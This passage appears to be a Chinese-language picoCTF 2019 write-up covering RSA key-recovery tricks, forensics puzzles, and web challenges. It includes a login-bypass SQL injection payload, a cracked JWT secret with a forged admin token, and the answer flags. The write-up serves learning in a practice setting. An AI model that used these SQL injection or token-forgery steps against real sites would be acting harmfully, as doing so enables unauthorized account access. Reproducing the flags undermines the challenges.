<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">	q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559</span><br><span class="line">	p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637</span><br><span class="line">	e : 65537</span><br><span class="line">	##### PRODUCE THE FOLLOWING ####</span><br><span class="line">	d</span><br><span class="line">	IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">	#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">	d: 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729</span><br><span class="line">	Outstanding move!!!</span><br></pre></td></tr></table></figure>
<p>第八题</p>
<blockquote>
<p>First find ‘q’, then find and then find ‘d’ using the formula:d=e^-1 mod toitent(n). After finding d use the formula m=cyphertext^d mod n or you can also use pow(cyphertext,d,n).</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">	p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433</span><br><span class="line">	ciphertext : 3001133423508155019342391181454969453683740998389305521868482065953685989583037773702319581717484580966593370778920602258110457396723632087223210560766860657023257472172328220084386229851941678615818536289364033769762938914666434052719653085203028823631950908006150453932488069330802006070658787154818367594933024991778763357876382724018717890178006250599003585272226771381223645294365192346693302207328966906968620673419237444014642963102675933287390856161621142811266283239380789957372689818205738309791091491858305530388074249507780688913259911773093289575133704279048285836964311807507701403508531667913455534667</span><br><span class="line">	e : 65537</span><br><span class="line">	n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239</span><br><span class="line">	##### PRODUCE THE FOLLOWING ####</span><br><span class="line">	plaintext</span><br><span class="line">	IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">	#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">	plaintext: 14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893</span><br><span class="line">	Outstanding move!!!</span><br><span class="line">If you convert the last plaintext to a hex number, then ascii, you&apos;ll find what you need! ;)</span><br></pre></td></tr></table></figure>
<p>最后步骤<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.15+ (default, Oct  7 2019, 17:39:04) </span><br><span class="line">[GCC 7.4.0] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; hex(14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893)</span><br><span class="line"><span class="string">'0x7069636f4354467b7741385f74683474245f696c6c336147616c2e2e6f31383238643335377dL'</span></span><br><span class="line">&gt;&gt;&gt; <span class="string">'7069636f4354467b7741385f74683474245f696c6c336147616c2e2e6f31383238643335377d'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'picoCTF&#123;wA8_th4t$_ill3aGal..o1828d357&#125;'</span></span><br></pre></td></tr></table></figure></p>
<p><code>picoCTF{wA8_th4t$_ill3aGal..o1828d357}</code></p>
<h2 id="miniRSA-Points-300"><a href="#miniRSA-Points-300" class="headerlink" title="miniRSA - Points: 300"></a>miniRSA - Points: 300</h2><blockquote>
<p>Lets decrypt this: ciphertext? Something seems a bit small<br>Hints: RSA tutorial<a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/RSA_(cryptosystem)</a>)<br>How could having too small an e affect the security of this 2048 bit key?<br>Make sure you dont lose precision, the numbers are pretty big (besides the e value)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N: 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673</span><br><span class="line">e: 3</span><br><span class="line"></span><br><span class="line">ciphertext (c): 2205316413931134031074603746928247799030155221252519872649604243394069216326314270624430181767863085854215545736160599718939066687544261205735290002239045830806570632200667142910415788763317978137702614731825117431700919216297401306846053</span><br></pre></td></tr></table></figure>
<p>e为3时最常见的指数是65537,直接调用gmpy2库解密<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.15+ (default, Oct  7 2019, 17:39:04) </span><br><span class="line">[GCC 7.4.0] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import gmpy2</span><br><span class="line">&gt;&gt;&gt; from gmpy2 import mpz</span><br><span class="line">&gt;&gt;&gt; x=2205316413931134031074603746928247799030155221252519872649604243394069216326314270624430181767863085854215545736160599718939066687544261205735290002239045830806570632200667142910415788763317978137702614731825117431700919216297401306846053</span><br><span class="line">&gt;&gt;&gt; gmpy2.iroot(x,3)</span><br><span class="line">(mpz(13016382529449106065894479374027604750406953699090365388202785764091466430362237L), True)</span><br><span class="line">&gt;&gt;&gt; hex(13016382529449106065894479374027604750406953699090365388202785764091466430362237)</span><br><span class="line"><span class="string">'0x7069636f4354467b6e3333645f615f6c41726733725f655f31646365613061327dL'</span></span><br><span class="line">&gt;&gt;&gt; <span class="string">'7069636f4354467b6e3333645f615f6c41726733725f655f31646365613061327d'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'picoCTF&#123;n33d_a_lArg3r_e_1dcea0a2&#125;'</span></span><br></pre></td></tr></table></figure></p>
<p>picoCTF{n33d_a_lArg3r_e_1dcea0a2}</p>
<h2 id="b00tl3gRSA2-Points-400"><a href="#b00tl3gRSA2-Points-400" class="headerlink" title="b00tl3gRSA2 - Points: 400"></a>b00tl3gRSA2 - Points: 400</h2><blockquote>
<p>In RSA d is alot bigger than e, why dont we use d to encrypt instead of e? Connect with nc 2019shell1.picoctf.com 25894.<br>HInts: What is e generally?</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c: 2907769365419444727724175525671479981034192273204157726490522975279978593460225718961335784293417741607844791576565752988761172584273921395504823687108723176653809711169572251090119440733253837992509444186223539794384266837974042900938754540469801677256722806361322725611718921210360254805056231994475857991</span><br><span class="line">n: 104632934684607347040516088721842504035835154723230245213808635990738949032699364042811143172516764890701695806265159972897211958854001703738425521421300793289421837444580747279427459325350271662864746224966534428867373786235636261074057852584587383908394377990543646006651631195118177751615662277651780552659</span><br><span class="line">e: 55055344609365698084214364458001081971584593061566317896043105474840806238363136390928780096145202259654199584711655652614362225752191811521977900738394126069944440703568029472306324641124595496813413986093178525922575816469353968511903928979464226600653482605581664396016087501078623594868326395140317882593</span><br></pre></td></tr></table></figure>
<p>e很大容易造成维纳攻击,解题过程:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/CTF-RSA-tool<span class="comment"># touch rsa.txt</span></span><br><span class="line">/CTF-RSA-tool<span class="comment"># vi rsa.txt //按照格式把 n e c 写入</span></span><br><span class="line">/CTF-RSA-tool<span class="comment"># python solve.py -i rsa.txt</span></span><br><span class="line">INFO: picoCTF&#123;bad_1d3a5_3468581&#125;</span><br></pre></td></tr></table></figure></p>
<p>picoCTF{bad_1d3a5_3468581}</p>
<h1 id="杂项-Forensics"><a href="#杂项-Forensics" class="headerlink" title="杂项(Forensics)"></a>杂项(Forensics)</h1><h2 id="WhitePages-Points-250"><a href="#WhitePages-Points-250" class="headerlink" title="WhitePages - Points: 250"></a>WhitePages - Points: 250</h2><blockquote>
<p>I stopped using YellowPages and moved onto WhitePages… but the page they gave me is all blank!</p>
</blockquote>
<p>用sublime打开,替换里面的不明字符和空格成0和1,再进行转换</p>
<figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{not_all_spaces_are_created_equal_f006c045f6b402ce4bc749dc7a262380}</p>
<h2 id="like1000-Points-250"><a href="#like1000-Points-250" class="headerlink" title="like1000 - Points: 250"></a>like1000 - Points: 250</h2><blockquote>
<p>This .tar file got tarred alot. Also available at /problems/like1000_0_369bbdba2af17750ddf10cc415672f1c.<br>Hints: Try and script this, it’ll save you alot of time</p>
</blockquote>
<p>要解压1000次,并把里面的内容写入一个文件,用脚本解决</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">  tf = tarfile.open(str(i)+<span class="string">".tar"</span>)</span><br><span class="line">  tf.extractall()</span><br></pre></td></tr></table></figure>
<p>得到最后一层的flag图片<br><figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>picoCTF{l0t5_0f_TAR5}</p>
<h2 id="shark-on-wire-2-Points-300"><a href="#shark-on-wire-2-Points-300" class="headerlink" title="shark on wire 2 - Points: 300"></a>shark on wire 2 - Points: 300</h2><blockquote>
<p>We found this packet capture. Recover the flag that was pilfered from the network. You can also find the file in /problems/shark-on-wire-2_0_3e92bfbdb2f6d0e25b8d019453fdbf07.</p>
</blockquote>
<p>在观察这些流之后,发现有效负载从UDP流32开始,过滤源IP后可以看到类似的包,唯一改变的就是端口号,都减去5000后转为字符串就可以得到flag</p>
<figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>这里用的是大佬的bash脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">chr</span></span>() &#123;</span><br><span class="line">  <span class="built_in">printf</span> \\$(<span class="built_in">printf</span> <span class="string">'%03o'</span> <span class="variable">$1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> $(tshark -r ./capture.pcap -T fields -e udp.srcport -Y <span class="string">"ip.src == 10.0.0.66"</span>); <span class="keyword">do</span></span><br><span class="line">    chr $(( <span class="variable">$&#123;p&#125;</span> - 5000 ))</span><br><span class="line"><span class="keyword">done</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
<p>picoCTF{p1LLf3r3d_data_v1a_st3g0}</p>
<h1 id="WEB应用-Web-Exploitation"><a href="#WEB应用-Web-Exploitation" class="headerlink" title="WEB应用(Web Exploitation)"></a>WEB应用(Web Exploitation)</h1><h2 id="Irish-Name-Repo-2-Points-350"><a href="#Irish-Name-Repo-2-Points-350" class="headerlink" title="Irish-Name-Repo 2 - Points: 350"></a>Irish-Name-Repo 2 - Points: 350</h2><blockquote>
<p>There is a website running at <a href="https://2019shell1.picoctf.com/problem/40968/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/40968/</a> (link). Someone has bypassed the login before, and now it’s being strengthened. Try to see if you can still login! or <a href="http://2019shell1.picoctf.com:40968" target="_blank" rel="noopener">http://2019shell1.picoctf.com:40968</a><br>Hints: The password is being filtered.</p>
</blockquote>
<p>左边的导航栏有 Admin login,进入管理员登陆页面,检查页面元素在password下面有个不显示的debug值,把debug值改成1,再进行sql注入</p>
<figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>发现反弹回来的是个sql注入查询语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL query: SELECT * FROM users WHERE name=&apos;&apos; AND password=&apos;&apos;</span><br></pre></td></tr></table></figure>
<p>payload: <code>?username=admin&#39;--&amp;password=1&amp;debug=1</code><br>返回的mysql查询语句是: <code>SELECT * FROM users WHERE name=&#39;admin&#39;--&#39; AND password=&#39;1&#39;</code></p>
<p>会把and后面的语句注释掉进行无密码登录</p>
<figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{m0R3_SQL_plz_daf42601}</p>
<h2 id="Irish-Name-Repo-3-Points-400"><a href="#Irish-Name-Repo-3-Points-400" class="headerlink" title="Irish-Name-Repo 3 - Points: 400"></a>Irish-Name-Repo 3 - Points: 400</h2><blockquote>
<p>There is a secure website running at <a href="https://2019shell1.picoctf.com/problem/47247/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/47247/</a> (link) or <a href="http://2019shell1.picoctf.com:47247" target="_blank" rel="noopener">http://2019shell1.picoctf.com:47247</a>. Try to see if you can login as admin!<br>Hints: Seems like the password is encrypted.</p>
</blockquote>
<p>依旧是adminlogin页面,debug改为1,尝试admin登陆</p>
<figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>是个凯撒位移13位的加密,可以构造or查询语句</p>
<figure class="image-box">
                <img src="./9.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{3v3n_m0r3_SQL_c2c37f5e}</p>
<h2 id="JaWT-Scratchpad-Points-400"><a href="#JaWT-Scratchpad-Points-400" class="headerlink" title="JaWT Scratchpad - Points: 400"></a>JaWT Scratchpad - Points: 400</h2><blockquote>
<p>Check the admin scratchpad! <a href="https://2019shell1.picoctf.com/problem/37903/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/37903/</a> or <a href="http://2019shell1.picoctf.com:37903" target="_blank" rel="noopener">http://2019shell1.picoctf.com:37903</a><br>Hints: What is that cookie?<br>Have you heard of JWT?</p>
</blockquote>
<p>我是第一次接触到JaWT和JWT,对于这道题是参考了Ch3lLIST4师傅的wp</p>
<p>简单了解下JWT(JSON Web Token)由三部分组成，分别是头信息、有效载荷、签名，中间以（.）分隔</p>
<p>header部分由令牌类型和散列算法组成 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload部分由claims构成,经过Base64Url编码，形成JWT的第二部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>签名令牌的信息虽然可以防止篡改,但任何人都可以读取(除非加密),所以不要将敏感信息放入到Payload或Header元素中,换言之我们就可以通过在cookie中写入令牌来进行伪身份访问<br>Signature部分需要用到编码的Header,编码的Payload,秘钥,Header中指定的算法,并对其进行签名,在经过base64-url编码后会形成由三个.结束的base64字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>
<p>我以Damya的用户名登陆jwt,在cookie里发现了名为jwt的签名令牌<br><figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiRGFteWEifQ.ciYsP6qbAYf8PrvRIJsJRAUoz_By7XQBUwipfyAJ0vU</span><br></pre></td></tr></table></figure>
<p>初步解码可以得到header和payload部分,于是使用jwttool工具爆剩下的信息,因为页面提示了john,可能是要使用john的字典…然后在师傅的页面看到是kali的rockyou.txt,我正好有就不下john了,太大了<br><figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">root@iZ2ze5rmf8lyj1geahh44hZ:~/jwt_tool<span class="comment"># python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiRGFteWEifQ.ciYsP6qbAYf8PrvRIJsJRAUoz_By7XQBUwipfyAJ0vU -d ~/wordlists/rockyou.txt</span></span><br><span class="line"></span><br><span class="line">   $$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$$$\                  $$\ </span><br><span class="line">   \__$$ |$$ | $\  $$ |\__$$  __| \__$$  __|                 $$ |</span><br><span class="line">      $$ |$$ |$$$\ $$ |   $$ |       $$ | $$$$$$\   $$$$$$\  $$ |</span><br><span class="line">      $$ |$$ $$ $$\$$ |   $$ |       $$ |$$  __$$\ $$  __$$\ $$ |</span><br><span class="line">$$\   $$ |$$$$  _$$$$ |   $$ |       $$ |$$ /  $$ |$$ /  $$ |$$ |</span><br><span class="line">$$ |  $$ |$$$  / \$$$ |   $$ |       $$ |$$ |  $$ |$$ |  $$ |$$ |</span><br><span class="line">\$$$$$$  |$$  /   \$$ |   $$ |       $$ |\$$$$$$  |\$$$$$$  |$$ |</span><br><span class="line"> \______/ \__/     \__|   \__|$$$$$$\__| \______/  \______/ \__|</span><br><span class="line"> Version 1.3.2                \______|                           </span><br><span class="line"></span><br><span class="line">=====================</span><br><span class="line">Decoded Token Values:</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">Token header values:</span><br><span class="line">[+] typ = JWT</span><br><span class="line">[+] alg = HS256</span><br><span class="line"></span><br><span class="line">Token payload values:</span><br><span class="line">[+] user = Damya</span><br><span class="line"></span><br><span class="line">----------------------</span><br><span class="line">JWT common timestamps:</span><br><span class="line">iat = IssuedAt</span><br><span class="line">exp = Expires</span><br><span class="line">nbf = NotBefore</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">########################################################</span></span><br><span class="line"><span class="comment">#  Options:                                            #</span></span><br><span class="line"><span class="comment">#                ==== TAMPERING ====                   #</span></span><br><span class="line"><span class="comment">#  1: Tamper with JWT data (multiple signing options)  #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#             ==== VULNERABILITIES ====                #</span></span><br><span class="line"><span class="comment">#  2: Check for the "none" algorithm vulnerability     #</span></span><br><span class="line"><span class="comment">#  3: Check for HS/RSA key confusion vulnerability     #</span></span><br><span class="line"><span class="comment">#  4: Check for JWKS key injection vulnerability       #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#            ==== CRACKING/GUESSING ====               #</span></span><br><span class="line"><span class="comment">#  5: Check HS signature against a key (password)      #</span></span><br><span class="line"><span class="comment">#  6: Check HS signature against key file              #</span></span><br><span class="line"><span class="comment">#  7: Crack signature with supplied dictionary file    #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#            ==== RSA KEY FUNCTIONS ====               #</span></span><br><span class="line"><span class="comment">#  8: Verify RSA signature against a Public Key        #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#  0: Quit                                             #</span></span><br><span class="line"><span class="comment">########################################################</span></span><br><span class="line"></span><br><span class="line">Please make a selection (1-6)</span><br><span class="line">&gt; 7</span><br><span class="line"></span><br><span class="line">Loading key dictionary...</span><br><span class="line">File loaded: /root/wordlists/rockyou.txt</span><br><span class="line">Testing passwords <span class="keyword">in</span> dictionary...</span><br><span class="line">[*] Tested 1 million passwords so far</span><br><span class="line">[*] Tested 2 million passwords so far</span><br><span class="line">[*] Tested 3 million passwords so far</span><br><span class="line">[*] Tested 4 million passwords so far</span><br><span class="line">[*] Tested 5 million passwords so far</span><br><span class="line">[*] Tested 6 million passwords so far</span><br><span class="line">[*] Tested 7 million passwords so far</span><br><span class="line"></span><br><span class="line">[+] ilovepico is the CORRECT key!</span><br></pre></td></tr></table></figure>
<p>然后去jwt官网生成一个user位admin的假令牌<br><figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s</span><br></pre></td></tr></table></figure>
<p>将token替换cookie后刷新页面<br><figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>picoCTF{jawt_was_just_what_you_thought_9ed4519dee8140de7a186a5df5a08d6e}</p>
<h2 id="Java-Script-Kiddie-Points-400"><a href="#Java-Script-Kiddie-Points-400" class="headerlink" title="Java Script Kiddie - Points: 400"></a>Java Script Kiddie - Points: 400</h2><blockquote>
<p>The image link appears broken… <a href="https://2019shell1.picoctf.com/problem/37330" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/37330</a> or <a href="http://2019shell1.picoctf.com:37330" target="_blank" rel="noopener">http://2019shell1.picoctf.com:37330</a><br>Hints: This is only a JavaScript problem.</p>
</blockquote>
<p>查看源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bytes = [];</span><br><span class="line">$.get(<span class="string">"bytes"</span>, <span class="function"><span class="keyword">function</span><span class="params">(resp)</span> </span>&#123;</span><br><span class="line">	bytes = <span class="keyword">Array</span>.from(resp.split(<span class="string">" "</span>), x =&gt; Number(x));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assemble_png</span><span class="params">(u_in)</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> LEN = <span class="number">16</span>;</span><br><span class="line">	<span class="keyword">var</span> key = <span class="string">"0000000000000000"</span>;</span><br><span class="line">	<span class="keyword">var</span> shifter;</span><br><span class="line">	<span class="keyword">if</span>(u_in.length == LEN)&#123;</span><br><span class="line">		key = u_in;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> result = [];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; LEN; i++)&#123;</span><br><span class="line">		shifter = key.charCodeAt(i) - <span class="number">48</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; (bytes.length / LEN); j ++)&#123;</span><br><span class="line">			result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(result[result.length<span class="number">-1</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">		result = result.slice(<span class="number">0</span>,result.length<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	document.getElementById(<span class="string">"Area"</span>).src = <span class="string">"data:image/png;base64,"</span> + btoa(String.fromCharCode.apply(<span class="keyword">null</span>, <span class="keyword">new</span> Uint8Array(result)));</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>去到 bytes 页面,看到一大串十六进制码,用大佬的脚本将bytes还原成图片跑<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 